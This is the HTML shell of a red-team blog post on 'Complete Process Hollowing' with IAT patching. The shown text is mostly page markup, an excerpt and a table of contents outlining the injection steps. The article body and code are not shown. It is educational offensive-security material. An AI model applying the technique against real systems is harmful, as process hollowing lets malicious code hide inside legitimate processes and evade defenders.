<!DOCTYPE html>
<html lang="en">
  




<head>
	<meta charset="utf-8">
	<title>How to perform a Complete Process Hollowing - Red Team SNCF</title>
	<link rel="canonical" href="http://localhost:4000/complete-process-hollowing.html">
	<meta name="description" content="A blog post to explain how we can perform process hollowing with IAT patching.">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:4000"},
  "headline": "How to perform a Complete Process Hollowing",
  "abstract": "A blog post to explain how we can perform process hollowing with IAT patching.",
    "keywords": "Code injection, Coding, Malware Developpement, Windows",
    "wordcount": "7043",
    "image": ["http://localhost:4000/assets/imgposts/20240124/ProcessHollowing.jpg"],
  "datePublished": "2024-01-24 10:00:00 +0100",
  "dateModified": "2024-01-24 10:00:00 +0100",
  "author": {
    "@type": "Person",
    "name": "ZkClown"},
  "publisher": {
    "@type":  "Organization",
    "logo": {
        "@type": "ImageObject",
        "encodingFormat": "image/png",
        "contentUrl": "http://localhost:4000/assets/img/branding/SNCF.png",
        "url": "http://localhost:4000/assets/img/branding/SNCF.png"},
    "name" : "Red Team SNCF"}
}
</script>
<!-- Open Graph data -->
<meta property="og:url" content="http://localhost:4000/complete-process-hollowing.html"/>
<meta property="og:type" content="article"/>
<meta property="og:title" content="How to perform a Complete Process Hollowing"/>
<meta property="og:description" content="A blog post to explain how we can perform process hollowing with IAT patching."/>
<meta property="og:image" content="http://localhost:4000/assets/imgposts/20240124/ProcessHollowing.jpg"/>
<meta property="og:image:alt" content="How to perform a Complete Process Hollowing"/>
<meta property="og:site_name" content="Red Team SNCF" />
<meta property="article:published_time" content="2024-01-24 10:00:00 +0100" />
<meta property="article:modified_time" content="2024-01-24 10:00:00 +0100" />
<meta property="article:tag" content="Code injection, Coding, Malware Developpement, Windows" />
<meta property="fb:admins" content="" />
<!-- Schema.org markup for Google -->
<meta itemprop="name" content="How to perform a Complete Process Hollowing">
<meta itemprop="description" content="A blog post to explain how we can perform process hollowing with IAT patching.">
<meta itemprop="image" content="http://localhost:4000/assets/imgposts/20240124/ProcessHollowing.jpg">
<!-- Twitter Card data -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="">
<meta name="twitter:title" content="How to perform a Complete Process Hollowing">
<meta name="twitter:description" content="A blog post to explain how we can perform process hollowing with IAT patching.">
<meta name="twitter:creator" content="">
<meta data-rh="true" name="twitter:label1" content="Word count"/>
<meta data-rh="true" name="twitter:data1" content="7043"/>
<meta name="twitter:image:src" content="http://localhost:4000/assets/img/posts/20240124/ProcessHollowing.jpg">
	<!-- Windows Phone -->
	<meta name="msapplication-navbutton-color" content="#311e3e">
	<!-- iOS Safari -->
	<meta name="apple-mobile-web-app-status-bar-style" content="#311e3e">
	<!-- Google Fonts -->
	<link rel="preconnect" href="https://fonts.gstatic.com" />
	<style>
/* latin */
@font-face {
  font-family: 'Lora';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/s/lora/v17/0QIvMX1D_JOuMwr7I_FMl_E.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin */
@font-face {
  font-family: 'Lora';
  font-style: normal;
  font-weight: 600;
  src: url(https://fonts.gstatic.com/s/lora/v17/0QIvMX1D_JOuMwr7I_FMl_E.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin */
@font-face {
  font-family: 'Source Sans Pro';
  font-style: normal;
  font-weight: 200;
  src: url(https://fonts.gstatic.com/s/sourcesanspro/v14/6xKydSBYKcSV-LCoeQqfX1RYOo3i94_wlxdu3cOWxw.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin */
@font-face {
  font-family: 'Source Sans Pro';
  font-style: normal;
  font-weight: 400;
  src: url(https://fonts.gstatic.com/s/sourcesanspro/v14/6xK3dSBYKcSV-LCoeQqfX1RYOo3qOK7lujVj9w.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
/* latin */
@font-face {
  font-family: 'Source Sans Pro';
  font-style: normal;
  font-weight: 700;
  src: url(https://fonts.gstatic.com/s/sourcesanspro/v14/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwlxdu3cOWxw.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
	</style>
	<!-- <link href="https://fonts.googleapis.com/css?family=Lora:400,600|Source+Sans+Pro:200,400,700" rel="stylesheet"> -->
	<!-- Font Awesome -->
	<link rel="stylesheet" href="./assets/fonts/font-awesome/css/font-awesome.min.css">
	<!-- Styles -->
	<link rel="stylesheet" href="./assets/css/main.css">
	




<link rel="icon" href="./assets/img/favicon/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="./assets/img/favicon/favicon.ico">
<link rel="apple-touch-icon" sizes="72x72" href="./assets/img/favicon/favicon.ico">
<link rel="apple-touch-icon" sizes="114x114" href="./assets/img/favicon/favicon.ico">
	
	<link rel="stylesheet" href="./assets/css/highlighter/syntax-base16.monokai.dark.css">
	
</head>

  <body>
    




<section class="hidden">
  <div class="post">
      <a  class="post-list-title" href="./complete-process-hollowing.html">How to perform a Complete Process Hollowing</a>
      

  <span class = "post-card-meta">
  
  
    <span class="meta-pre"></span>
  
  
    
      
      <span class="page_meta-date">
        <time datetime="2024-01-24T10:00:00+01:00">January 24, 2024</time>
      </span>
    
    
      <span class="meta-sep"></span>
    
  
  
    
    
    <span class="page_meta-readtime">
      
        35 minute read
      
    </span>
  
  
  </span>

        <div class="post-excerpt">
            <h1 id="how-to-perform-a-complete-process-hollowing">How to perform a Complete Process Hollowing</h1><h2 id="table-of-content">Table of Content</h2><ul> <li><a href="#abstract">Abstract</a></li> <li><a href="#basic-process-hollowing">Basic Process Hollowing</a> <ul> <li><a href="#definition">Definition</a></li> <li><a href="#start-a-suspended-process">Start a suspended process</a></li> <li><a href="#loadpe-and-retrieve-nt-headers">LoadPE and Retrieve NT Headers</a></li> <li><a href="#allocate-memory">Allocate Memory</a></li> <li><a href="#copy-pe-in-target-process">Copy PE in target process</a></li> <li><a href="#image-base-relocation">Image base Relocation</a></li> <li><a href="#changing-the-entrypoint-and-resuming-the-execution">Changing the entrypoint and resuming the execution</a></li> </ul> </li> <li><a href="#make-the-remote-process-load-the-required-libraries">Make the remote process load the required libraries</a> <ul> <li><a href="#load-an-arbitrary-dll-in-a-remote-process">Load an arbitrary DLL in a remote process</a></li> <li><a href="#resolve-injected-pe-iat-to-make-the-remote-process-load-all-the-dependencies">Resolve injected PE IAT to make the remote process load all the dependencies</a></li> <li><a href="#resolve-the-functions-and-libraries-addresses-on-the-remote-process">Resolve the functions and libraries addresses on the remote process</a></li> <li><a href="#retrieve-the-libraries-and-function-addresses">Retrieve...<a class="read-more" href="./complete-process-hollowing.html"> read more</a>
        </div>
  </div>
</section>
<div class="flex-container transparent">
  




<header class="main-header">
  <div class="wrapper">
    <div class="header-flex">
      <div class="menu-icon-container">
        <span class="menu-icon"><i class="fa fa-bars" aria-hidden="true"></i></span>
      </div>
      <nav class="main-nav">
        <span class="menu-icon-close"><i class="fa fa-times" aria-hidden="true"></i></span>
        <ul>
          <li>
            <div class="theme-toggle night">
    <input class="night" type="checkbox" id="theme-switch">
    <label class="night" for="theme-switch">
        <div class="toggle night"></div>
        <div class="names night">             
        <p class="light night"><svg class="night" width="20" viewBox="0 0 25 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
            <path class="night" d="M12.5 2.49871C11.3401 2.50016 10.2282 2.96156 9.40801 3.78171C8.58785 4.60187 8.12645 5.71383 8.125 6.87371C8.125 7.03947 8.19085 7.19844 8.30806 7.31565C8.42527 7.43286 8.58424 7.49871 8.75 7.49871C8.91576 7.49871 9.07473 7.43286 9.19194 7.31565C9.30915 7.19844 9.375 7.03947 9.375 6.87371C9.37593 6.04519 9.70547 5.25088 10.2913 4.66503C10.8772 4.07918 11.6715 3.74964 12.5 3.74871C12.6658 3.74871 12.8247 3.68286 12.9419 3.56565C13.0592 3.44844 13.125 3.28947 13.125 3.12371C13.125 2.95795 13.0592 2.79898 12.9419 2.68177C12.8247 2.56456 12.6658 2.49871 12.5 2.49871V2.49871ZM12.5 -0.00129131C8.47891 -0.00129131 5.62031 3.26238 5.625 6.88269C5.62487 8.54403 6.22974 10.1486 7.32656 11.3964C8.32891 12.5378 9.29062 14.4007 9.375 14.9987L9.37734 17.9358C9.37744 18.0587 9.41402 18.1787 9.48242 18.2807L10.4395 19.7198C10.4964 19.8055 10.5737 19.8758 10.6644 19.9245C10.7551 19.9731 10.8564 19.9986 10.9594 19.9987H14.0395C14.1426 19.9988 14.2441 19.9734 14.3351 19.9247C14.426 19.8761 14.5034 19.8057 14.5605 19.7198L15.5176 18.28C15.5854 18.1776 15.6219 18.0578 15.6227 17.935L15.625 14.9987C15.7129 14.3846 16.6797 12.5303 17.6734 11.3964C18.5434 10.4028 19.1087 9.17963 19.3015 7.87318C19.4944 6.56673 19.3066 5.23238 18.7608 4.02985C18.215 2.82732 17.3342 1.80757 16.2238 1.09264C15.1135 0.377721 13.8206 -0.00207746 12.5 -0.00129131V-0.00129131ZM14.3727 17.7452L13.7047 18.7487H11.2937L10.6273 17.7452V17.4987H14.3738L14.3727 17.7452ZM14.375 16.2487H10.625L10.6227 14.9987H14.375V16.2487ZM16.7348 10.5725C16.1879 11.1956 15.316 12.4511 14.7594 13.7479H10.243C9.68516 12.4507 8.81328 11.1956 8.26641 10.5725C7.36971 9.5491 6.87599 8.2344 6.87734 6.87371C6.87031 3.8659 9.23594 1.24871 12.5 1.24871C15.602 1.24871 18.125 3.77176 18.125 6.87371C18.1249 8.23456 17.6305 9.54904 16.7336 10.5725H16.7348ZM3.75 6.87371C3.75 6.70795 3.68415 6.54898 3.56694 6.43177C3.44973 6.31456 3.29076 6.24871 3.125 6.24871H0.625C0.45924 6.24871 0.300269 6.31456 0.183058 6.43177C0.065848 6.54898 0 6.70795 0 6.87371C0 7.03947 0.065848 7.19844 0.183058 7.31565C0.300269 7.43286 0.45924 7.49871 0.625 7.49871H3.125C3.29076 7.49871 3.44973 7.43286 3.56694 7.31565C3.68415 7.19844 3.75 7.03947 3.75 6.87371ZM20.625 2.49871C20.7221 2.49849 20.8178 2.4759 20.9047 2.43269L23.4047 1.18269C23.5529 1.10852 23.6657 0.978483 23.718 0.821201C23.7704 0.66392 23.7582 0.492273 23.684 0.344021C23.6473 0.270614 23.5964 0.205161 23.5344 0.151397C23.4724 0.0976336 23.4004 0.0566132 23.3225 0.0306781C23.1652 -0.0217002 22.9936 -0.00945342 22.8453 0.0647243L20.3453 1.31472C20.2194 1.37771 20.1184 1.48136 20.0588 1.60889C19.9991 1.73643 19.9843 1.88037 20.0166 2.0174C20.049 2.15442 20.1267 2.2765 20.2371 2.36386C20.3475 2.45122 20.4842 2.49873 20.625 2.49871ZM24.375 6.24871H21.875C21.7092 6.24871 21.5503 6.31456 21.4331 6.43177C21.3158 6.54898 21.25 6.70795 21.25 6.87371C21.25 7.03947 21.3158 7.19844 21.4331 7.31565C21.5503 7.43286 21.7092 7.49871 21.875 7.49871H24.375C24.5408 7.49871 24.6997 7.43286 24.8169 7.31565C24.9342 7.19844 25 7.03947 25 6.87371C25 6.70795 24.9342 6.54898 24.8169 6.43177C24.6997 6.31456 24.5408 6.24871 24.375 6.24871ZM4.65469 1.31472L2.15469 0.0647243C2.08128 0.0279952 2.00136 0.00608435 1.91948 0.00024269C1.83761 -0.00559897 1.75539 0.004743 1.67751 0.0306781C1.52023 0.0830564 1.39019 0.195769 1.31602 0.344021C1.24184 0.492273 1.22959 0.66392 1.28197 0.821201C1.33435 0.978483 1.44706 1.10852 1.59531 1.18269L4.09531 2.43269C4.18223 2.4759 4.27794 2.49849 4.375 2.49871C4.5158 2.49873 4.65248 2.45122 4.7629 2.36386C4.87332 2.2765 4.951 2.15442 4.98337 2.0174C5.01574 1.88037 5.0009 1.73643 4.94124 1.60889C4.88158 1.48136 4.78061 1.37771 4.65469 1.31472ZM23.4047 12.5647L20.9047 11.3147C20.7564 11.2405 20.5847 11.2283 20.4274 11.2807C20.2701 11.3332 20.14 11.4459 20.0658 11.5942C19.9916 11.7425 19.9794 11.9142 20.0318 12.0715C20.0842 12.2289 20.197 12.3589 20.3453 12.4331L22.8453 13.6831C22.9936 13.7573 23.1653 13.7695 23.3226 13.7171C23.4799 13.6647 23.61 13.5519 23.6842 13.4036C23.7584 13.2553 23.7706 13.0836 23.7182 12.9263C23.6658 12.769 23.553 12.6389 23.4047 12.5647V12.5647ZM4.375 11.2487C4.27794 11.2489 4.18223 11.2715 4.09531 11.3147L1.59531 12.5647C1.44701 12.6389 1.33425 12.769 1.28183 12.9263C1.25588 13.0042 1.24552 13.0864 1.25135 13.1683C1.25719 13.2502 1.27909 13.3302 1.31582 13.4036C1.35255 13.477 1.40338 13.5425 1.46542 13.5963C1.52745 13.6501 1.59947 13.6911 1.67737 13.7171C1.83469 13.7695 2.00638 13.7573 2.15469 13.6831L4.65469 12.4331C4.78083 12.3702 4.88202 12.2666 4.94183 12.1389C5.00164 12.0113 5.01656 11.8672 4.98417 11.7301C4.95178 11.5929 4.87397 11.4707 4.76339 11.3833C4.65281 11.2959 4.51594 11.2485 4.375 11.2487V11.2487Z" /></svg></p>
        <p class="dark night"><svg class="night" width="20" viewBox="0 0 25 21" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
            <path class="night" d="M6.39614 3.72646C7.50591 1.56178 9.72622 0.00900831 12.4782 0.00114817C13.8006 -0.00388798 15.0965 0.375153 16.2101 1.09278C17.3237 1.8104 18.2079 2.83612 18.7564 4.04682C19.3049 5.25751 19.4945 6.60175 19.3024 7.91818C19.1103 9.23461 18.5447 10.4673 17.6735 11.4683C17.5227 11.6416 17.3516 11.859 17.1739 12.1069L9.47856 6.12184C9.65443 5.45016 10.046 4.85578 10.5924 4.43118C11.1387 4.00657 11.8093 3.77554 12.4997 3.77401C12.6654 3.77401 12.8244 3.70776 12.9416 3.58984C13.0588 3.47191 13.1247 3.31197 13.1247 3.1452C13.1247 2.97843 13.0588 2.81849 12.9416 2.70057C12.8244 2.58264 12.6654 2.51639 12.4997 2.51639C11.6212 2.5173 10.7634 2.78383 10.0374 3.28141C9.31146 3.77899 8.75092 4.48463 8.42856 5.30674L6.39614 3.72646ZM6.39614 10.0841C6.64968 10.5817 6.96225 11.0465 7.327 11.4683C7.97231 12.2091 8.98169 13.7568 9.36645 15.0624C9.36645 15.0726 9.36919 15.0828 9.37075 15.093H12.8372L6.39614 10.0841ZM9.37466 16.3502V17.8574C9.37584 18.1045 9.44934 18.3458 9.58599 18.5511L10.2536 19.5607C10.3675 19.7335 10.5221 19.8753 10.7037 19.9734C10.8852 20.0715 11.0881 20.1229 11.2942 20.1231H13.7047C13.9107 20.1231 14.1135 20.0718 14.2951 19.9739C14.4766 19.876 14.6313 19.7345 14.7454 19.5619L15.4129 18.5511C15.5492 18.3451 15.622 18.1033 15.6223 17.8558V17.2581L14.4528 16.3502H9.37466Z"/>
            <path class="night" d="M0.131556 1.2363L0.898352 0.243172C0.948738 0.177883 1.01142 0.123229 1.08282 0.0823368C1.15423 0.0414448 1.23294 0.0151171 1.31446 0.00486006C1.39598 -0.00539702 1.47872 0.000617709 1.55793 0.0225602C1.63714 0.0445026 1.71127 0.0819422 1.77609 0.132737L24.7585 18.0039C24.8894 18.1062 24.9745 18.2567 24.9952 18.4221C25.0158 18.5876 24.9703 18.7545 24.8687 18.8862L24.1015 19.8794C24.0511 19.9446 23.9884 19.9992 23.917 20.0401C23.8457 20.0809 23.767 20.1072 23.6855 20.1175C23.6041 20.1277 23.5214 20.1217 23.4422 20.0998C23.363 20.0779 23.2889 20.0405 23.2241 19.9898L0.241322 2.1186C0.110489 2.01624 0.0254259 1.86578 0.00484145 1.70032C-0.015743 1.53486 0.0298368 1.36795 0.131556 1.2363V1.2363Z"/>
            </svg></p>
        </div>
    </label>
</div>
          </li>
          <li>
            <a href="./">
              <div class="left">
                Home
              </div>  
              <div class="right">
                <svg width="24px" aria-hidden="true" focusable="false" role="img" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><g><rect x="83.534" y="40.929" width="3.997" height="20.071"/></g><path d="M16.466,41.931l33.548-25.123L92.81,48.877l2.396-3.198L50.015,11.814L4.794,45.679l2.396,3.199l5.279-3.954v42.763h75.062  V61h-3.997v22.69H64.598V54.068H35.402V83.69H16.466V41.931z M39.399,58.065h21.202V83.69H39.399V58.065z"/></svg>
              </div>
            </a>
          </li>
          <li>
            <a href="./archive.html">
              <div class="left">
                All Posts
              </div>
              <div class="right">
                <svg width="24px" aria-hidden="true" focusable="false" role="img" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="-3 3 64 64"><g><path d="M60.992,31.985c0-15.979-13-28.978-28.979-28.978c-15.994,0-29.006,12.999-29.006,28.978   c0,15.994,13.012,29.007,29.006,29.007v-2c-14.891,0-27.006-12.115-27.006-27.007c0-14.875,12.115-26.978,27.006-26.978   c14.876,0,26.979,12.103,26.979,26.978c0,8.945-4.479,17.329-11.804,22.338l0.874-10.062l-1.992-0.174l-1.135,13.071l13.042,1.136   l0.174-1.992l-9.183-0.799C56.443,50.079,60.992,41.321,60.992,31.985z"/><polygon points="33.014,12.682 31.014,12.682 31.014,32.398 39.811,41.224 41.227,39.812 33.014,31.572  "/></g></svg>
              </div>
            </a>
          </li>
          <li>
            <a href="./tags.html">
              <div class="left">
                Tags
              </div>
              <div class="right">
                <svg width="24px" aria-hidden="true" focusable="false" role="img" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><g><path d="M75.244,15.066c-2.59,0-5.027,1.012-6.857,2.843c-3.781,3.785-3.778,9.94,0.002,13.724    c1.831,1.833,4.266,2.843,6.857,2.843s5.026-1.01,6.861-2.843c3.781-3.785,3.781-9.943-0.002-13.724    C80.275,16.076,77.838,15.066,75.244,15.066z M78.766,28.252c-1.871,1.869-5.129,1.869-6.996,0c-1.929-1.931-1.931-5.069-0.002-7    c0.934-0.934,2.175-1.448,3.498-1.448c1.322,0,2.564,0.515,3.5,1.448C80.691,23.183,80.691,26.321,78.766,28.252z M94.632,41.027    l0.005-28.872c0-3.745-3.05-6.792-6.792-6.792L58.973,5.368l-1.237-0.004c-1.893,0-4.75,0-6.617,1.869L7.008,51.342    c-1.06,1.059-1.645,2.467-1.645,3.966s0.583,2.908,1.644,3.968l33.717,33.717c1.058,1.06,2.467,1.645,3.966,1.645    s2.908-0.585,3.968-1.645l44.106-44.111c1.893-1.886,1.88-4.604,1.869-7.227L94.632,41.027z M90.022,46.139L45.913,90.25    c-0.654,0.65-1.792,0.652-2.443,0L9.752,56.532c-0.328-0.327-0.507-0.762-0.507-1.225c0-0.462,0.18-0.894,0.507-1.221    L53.861,9.976c0.676-0.674,2.284-0.731,3.874-0.731l1.237,0.004l28.872-0.004c1.604,0,2.909,1.306,2.909,2.911l-0.005,28.872    l0.005,0.642C90.76,43.585,90.769,45.392,90.022,46.139z"/></g></svg>
              </div>
            </a>
          </li>
          <li>
            <a href="./about.html">
              <div class="left">
                About
              </div>
              <div class="right">
                <svg width='24px' aria-hidden="true" focusable="false" role="img" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 846.66 846.66"><g><path d="M351.26 453.22c-276.42,134.06 -224.86,336.22 -224.73,336.8 6.03,25.41 -32.58,34.56 -38.6,9.15 -0.15,-0.65 -55.78,-219.32 218.87,-367.66 -60.98,-39 -100.02,-106.82 -100.02,-182.56 0,-119.6 96.95,-216.55 216.55,-216.55 119.6,0 216.55,96.95 216.55,216.55 0,75.74 -39.04,143.56 -100.02,182.56 274.65,148.34 219.02,367.01 218.87,367.66 -6.02,25.41 -44.63,16.26 -38.6,-9.15 0.13,-0.58 51.69,-202.74 -224.73,-336.8 -22.55,7.96 -46.8,12.29 -72.07,12.29 -25.27,0 -49.52,-4.33 -72.07,-12.29zm72.07 -381.14c-97.68,0 -176.87,79.19 -176.87,176.87 0,97.69 79.19,176.87 176.87,176.87 97.68,0 176.87,-79.18 176.87,-176.87 0,-97.68 -79.19,-176.87 -176.87,-176.87z"/></g></svg>
              </div>
            </a>
          </li>
          <li>
            <a href="./feed.xml">
              <div class="left">
                Atom feed
              </div>
              <div class="right">
                <svg width='24px' aria-hidden="true" focusable="false" role="img" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M80 352c26.467 0 48 21.533 48 48s-21.533 48-48 48-48-21.533-48-48 21.533-48 48-48m0-32c-44.183 0-80 35.817-80 80s35.817 80 80 80 80-35.817 80-80-35.817-80-80-80zm367.996 147.615c-6.448-237.848-198.06-429.164-435.61-435.61C5.609 31.821 0 37.229 0 44.007v8.006c0 6.482 5.146 11.816 11.626 11.994 220.81 6.05 398.319 183.913 404.367 404.367.178 6.48 5.512 11.626 11.994 11.626h8.007c6.778 0 12.185-5.609 12.002-12.385zm-144.245-.05c-6.347-158.132-133.207-284.97-291.316-291.316C5.643 175.976 0 181.45 0 188.247v8.005c0 6.459 5.114 11.72 11.567 11.989 141.134 5.891 254.301 119.079 260.192 260.192.269 6.453 5.531 11.567 11.989 11.567h8.005c6.798 0 12.271-5.643 11.998-12.435z"></path></svg>
              </div>
            </a>
          </li>
        </ul>
      </nav>
      
      
      <div class="logo"><a href="./"><img class="logo" id="logo" src="./assets/img/branding/SNCF_Full.png" alt="Red Team SNCF"></a></div>
      <div class="search-icon-container">
        <span class="search-icon"><a><i class="fa fa-search" aria-hidden="true"></i></a></span>
      </div>
    </div>
  </div>
</header> <!-- End Header -->

  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="How to perform a Complete Process Hollowing">
<meta itemprop="description" content="A blog post to explain how we can perform process hollowing with IAT patching.">
<meta itemprop="datePublished" content="2024-01-24T10:00:00+01:00">

    <div class="page-image">
      <div class="cover-image" style="background: url('./assets/img/posts/20240124/ProcessHollowing.jpg') center no-repeat; background-size: cover;"></div>
    </div>
    <div class="wrapper">
      <div class="page-content">
        <div class="header-page">
          <h1 class="page-title">How to perform a Complete Process Hollowing</h1>
          

  <span class = "post-page-meta">
  
    <p class="page_meta">
  
  
  
    
      
      <span class="page_meta-date">
        <time datetime="2024-01-24T10:00:00+01:00">January 24, 2024</time>
      </span>
    
    
      <span class="meta-sep"></span>
    
  
  
    
    
    <span class="page_meta-readtime">
      
        35 minute read
      
    </span>
  
  
    </p>
  
  </span>

        </div>
        <aside class="sidebar side" id="sidebar">
    



<div class="tag-cloud">
    
        <ul class="tags side">
            
                <li><a href="./tag.html?tag=Code+injection" class="tag side">Code injection</a></li>
            
                <li><a href="./tag.html?tag=Coding" class="tag side">Coding</a></li>
            
                <li><a href="./tag.html?tag=Malware+Developpement" class="tag side">Malware Developpement</a></li>
            
                <li><a href="./tag.html?tag=Windows" class="tag side">Windows</a></li>
            
    
        </ul>
</div>
    <div class="share-options side">
    <div class="share-hover side">
        <span class="share-button side"><svg fill="currentColor" width="25" height="25" class="side"><g fill-rule="evenodd"><path d="M15.6 5a.42.42 0 0 0 .17-.3.42.42 0 0 0-.12-.33l-2.8-2.79a.5.5 0 0 0-.7 0l-2.8 2.8a.4.4 0 0 0-.1.32c0 .12.07.23.16.3h.02a.45.45 0 0 0 .57-.04l2-2V10c0 .28.23.5.5.5s.5-.22.5-.5V2.93l2.02 2.02c.08.07.18.12.3.13.11.01.21-.02.3-.08v.01"></path><path d="M18 7h-1.5a.5.5 0 0 0 0 1h1.6c.5 0 .9.4.9.9v10.2c0 .5-.4.9-.9.9H6.9a.9.9 0 0 1-.9-.9V8.9c0-.5.4-.9.9-.9h1.6a.5.5 0 0 0 .35-.15A.5.5 0 0 0 9 7.5a.5.5 0 0 0-.15-.35A.5.5 0 0 0 8.5 7H7a2 2 0 0 0-2 2v10c0 1.1.9 2 2 2h11a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2"></path></g></svg></span>
        <div class="share-icons side" id="sidebar-icons">
            <a class="twitter" href="https://twitter.com/intent/tweet?text=How to perform a Complete Process Hollowing&url=http://localhost:4000/complete-process-hollowing.html" title="Share on Twitter" rel="nofollow" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
            <a class="facebook" href="https://facebook.com/sharer.php?u=http://localhost:4000/complete-process-hollowing.html" title="Share on Facebook" rel="nofollow" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a>
            <a class="reddit" href="http://www.reddit.com/submit?url=http://localhost:4000/complete-process-hollowing.html&title=How to perform a Complete Process Hollowing" title="Submit to Reddit" rel="nofollow" target="_blank"><i class="fa fa-reddit" aria-hidden="true"></i></a>
            <a class="linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/complete-process-hollowing.html&title=How to perform a Complete Process Hollowing&summary=A blog post to explain how we can perform process hollowing with IAT patching.&source=http://localhost:4000/complete-process-hollowing.html" title="Share on LinkedIn" rel="nofollow" target="_blank"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
            <a class="email" href="mailto:?subject=How to perform a Complete Process Hollowing&body=A blog post to explain how we can perform process hollowing with IAT patching.%0A%0ARead more here: http://localhost:4000/complete-process-hollowing.html" title="Share via e-mail" rel="nofollow" target="_blank"><i class="fa fa-envelope" aria-hidden="true"></i></a>
            <a class="copy-link" onclick="copyToClipboard()" title="Copy to clipboard" rel="nofollow" target="_blank"><svg width="20px" fill="currentColor" class="side" viewBox="0 0 18 18"><path d="M16.94 1.1A3.7 3.7 0 0 0 14.3 0c-1 0-1.94.39-2.64 1.1L7.43 5.3c-.91.92-2.09 3.2 0 5.27a.75.75 0 0 0 .82.16c.09-.03.17-.09.24-.15a.74.74 0 0 0 0-1.06c-1.16-1.15-.77-2.39-.02-3.16l4.24-4.22a2.2 2.2 0 0 1 1.58-.65c.6 0 1.16.23 1.58.65.86.87.86 2.29 0 3.16L12.7 8.47a.74.74 0 0 0 1.04 1.05l3.17-3.16a3.73 3.73 0 0 0 0-5.27h.03zM9.54 7.4a.74.74 0 0 0 0 1.06c1.16 1.15.76 2.39 0 3.16l-4.22 4.22c-.42.42-.99.65-1.59.65a2.23 2.23 0 0 1-1.58-3.82l3.17-3.16A.73.73 0 0 0 5.54 9a.78.78 0 0 0-.22-.52.77.77 0 0 0-1.05 0L1.1 11.64A3.72 3.72 0 0 0 3.74 18c1 0 1.94-.39 2.65-1.1l4.23-4.2c.21-.22.94-1.02 1.13-2.2.18-1.12-.2-2.15-1.12-3.07-.27-.27-.78-.27-1.06 0l-.02-.02z" clip-rule="evenodd" fill-rule="evenodd"></path></svg></a>
        </div>
    </div>
    <div class='alert' style='font-size:.6em;color:var(--accent);text-align:center;'></div>
</div>
</aside>

        
        
<div class="center-container">
  <div class="github-button">
    <span class="button-icon" aria-hidden="true"><svg aria-hidden="true" focusable="false" role="img" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12,2.2467A10.00042,10.00042,0,0,0,8.83752,21.73419c.5.08752.6875-.21247.6875-.475,0-.23749-.01251-1.025-.01251-1.86249C7,19.85919,6.35,18.78423,6.15,18.22173A3.636,3.636,0,0,0,5.125,16.8092c-.35-.1875-.85-.65-.01251-.66248A2.00117,2.00117,0,0,1,6.65,17.17169a2.13742,2.13742,0,0,0,2.91248.825A2.10376,2.10376,0,0,1,10.2,16.65923c-2.225-.25-4.55-1.11254-4.55-4.9375a3.89187,3.89187,0,0,1,1.025-2.6875,3.59373,3.59373,0,0,1,.1-2.65s.83747-.26251,2.75,1.025a9.42747,9.42747,0,0,1,5,0c1.91248-1.3,2.75-1.025,2.75-1.025a3.59323,3.59323,0,0,1,.1,2.65,3.869,3.869,0,0,1,1.025,2.6875c0,3.83747-2.33752,4.6875-4.5625,4.9375a2.36814,2.36814,0,0,1,.675,1.85c0,1.33752-.01251,2.41248-.01251,2.75,0,.26251.1875.575.6875.475A10.0053,10.0053,0,0,0,12,2.2467Z"/></svg></span>
    <a class="button-text" href="https://github.com/Red-Team-SNCF/Complete-Process-Hollowing" target="_blank" aria-label="Open on GitHub">view on <b>GitHub</b></a>
  </div>
</div>

        <h1 id="how-to-perform-a-complete-process-hollowing">How to perform a Complete Process Hollowing</h1>

<h2 id="table-of-content">Table of Content</h2>

<ul>
  <li><a href="#abstract">Abstract</a></li>
  <li><a href="#basic-process-hollowing">Basic Process Hollowing</a>
    <ul>
      <li><a href="#definition">Definition</a></li>
      <li><a href="#start-a-suspended-process">Start a suspended process</a></li>
      <li><a href="#loadpe-and-retrieve-nt-headers">LoadPE and Retrieve NT Headers</a></li>
      <li><a href="#allocate-memory">Allocate Memory</a></li>
